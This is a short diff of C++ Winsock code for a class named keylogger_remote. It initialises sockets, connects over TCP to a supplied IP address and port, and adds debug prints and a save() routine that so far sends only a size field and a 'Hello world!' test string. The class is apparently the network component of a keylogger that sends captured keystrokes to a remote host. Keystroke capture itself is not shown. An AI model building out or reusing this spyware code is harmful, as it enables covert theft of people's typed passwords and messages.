@@ -18,7 +18,9 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 
 	int t_result = 0;
 
-	t_result = WSAStartup(MAKEWORD(2,2), &t_wsa_data);
+	t_result = WSAStartup(MAKEWORD(2,0), &t_wsa_data);
+
+	cout << "WSAStartup" << endl;
 
 	if(t_result != NO_ERROR)
 	{
@@ -27,11 +29,13 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	}
 
 	SOCKADDR_IN t_sockaddr_in;
-	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ip_address.c_str());
+	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ip_address.c_str()); //inet_addr(p_ip_address);
 	t_sockaddr_in.sin_family      = AF_INET;
 	t_sockaddr_in.sin_port		  = htons(p_port);
 
 	a_socket = socket(AF_INET,SOCK_STREAM,0);
+
+	cout << "socket" << endl;
 
 	if(a_socket == INVALID_SOCKET)
 	{
@@ -41,6 +45,8 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	}
 
 	t_result = connect(a_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));
+
+	cout << "connect" << endl;
 
 	if(t_result != NO_ERROR)
 	{
@@ -52,5 +58,11 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 
 void keylogger_remote::save()
 {
+	cout << "Send" << endl;
 
+	int t_size = 4;
+
+	send(a_socket, (char*) &t_size, sizeof(int), 0);
+
+	send(a_socket, "Hello world!\r\n", 14, 0);
 }
